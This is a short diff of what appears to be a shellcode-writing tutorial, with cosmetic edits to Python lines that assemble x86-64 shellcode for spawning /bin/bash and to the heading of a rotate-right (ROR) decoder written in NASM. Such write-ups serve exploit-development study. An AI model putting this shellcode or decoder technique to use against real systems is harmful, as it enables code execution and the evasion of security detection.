@@ -29,7 +29,7 @@ shellcode += "\x48\x31\xff"     # xor rdi, rdi
 shellcode += "\x57"             # push rdi
 shellcode += "\x48\x83\xc2\x68" # add rdx, 0x68
 shellcode += "\x52"             # push rdx
-shellcode += "\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" # movabs rdx, 0x7361622f6e69622f ; "/bin/bas"
+shellcode += "\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" # movabs rdx, 0x7361622f6e69622f
 shellcode += "\x52"             # push rdx
 shellcode += "\x48\x31\xd2"     # xor rdx, rdx
 shellcode += "\x48\x89\xe7"     # mov rdi, rsp ; rdi = Pointer -> "/bin/bash"0x00
@@ -63,7 +63,8 @@ Len: 36
 ```
 
 # The Rotate Right (ROR) Decoder
-```asm
+
+```c
 ; Filename: rotateRightDecoder.nasm
 ; Author:   boku
 global _start
